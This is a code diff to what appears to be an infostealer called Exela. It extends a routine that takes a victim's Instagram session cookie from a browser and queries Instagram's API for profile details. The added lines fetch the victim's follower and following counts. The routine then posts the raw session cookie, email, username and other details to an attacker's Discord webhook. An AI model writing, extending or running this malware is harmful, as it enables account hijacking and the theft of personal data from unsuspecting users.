@@ -381,6 +381,8 @@ class QuicaxdExela:
             headers = {"user-agent": "Instagram 219.0.0.12.117 Android", "cookie":sessionid}
             infoURL = 'https://i.instagram.com/api/v1/accounts/current_user/?edit=true'
             data = requests.get(infoURL, headers=headers).json()    
+            infoURL2 = f"https://i.instagram.com/api/v1/users/{data['user']['pk']}/info/"
+            data2 = requests.get(infoURL2, headers=headers).json()
             try:
                 pp = data["user"]["profile_pic_url"]
             except:
@@ -395,6 +397,8 @@ class QuicaxdExela:
             else:fullname = data["user"]["full_name"]
             email = data["user"]["email"]
             verify = data["user"]["is_verified"]
+            followers = data2["user"]["follower_count"]
+            following = data2["user"]["following_count"]
             embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Instagram Session was detected on the{value} Browser***", color=0x070707, url="https://github.com/quicaxd",timestamp = "now")
             embed.set_thumbnail(url=pp)
             embed.add_field(name="Instagram Cookie", inline=True, value=f"```{sessionid}```")
@@ -402,7 +406,9 @@ class QuicaxdExela:
             embed.add_field(name="Username", inline=True, value=f"```{username}```")
             embed.add_field(name="Nick Name", inline=True, value=f"```{fullname}```")
             embed.add_field(name="is Verified", inline=True, value=f"```{verify}```")
-            embed.add_field(name="Email", inline=False, value=f"```{email}```")
+            embed.add_field(name="Email", inline=True, value=f"```{email}```")
+            embed.add_field(name="Followers", inline=True, value=f"```{followers}```")
+            embed.add_field(name="Following", inline=True, value=f"```{following}```")
             embed.add_field(name="Biography", inline=False, value=f"```{bio}```")
             embed.set_footer(text="https://t.me/ExelaStealer")
             self.hook.send(embed=embed)  
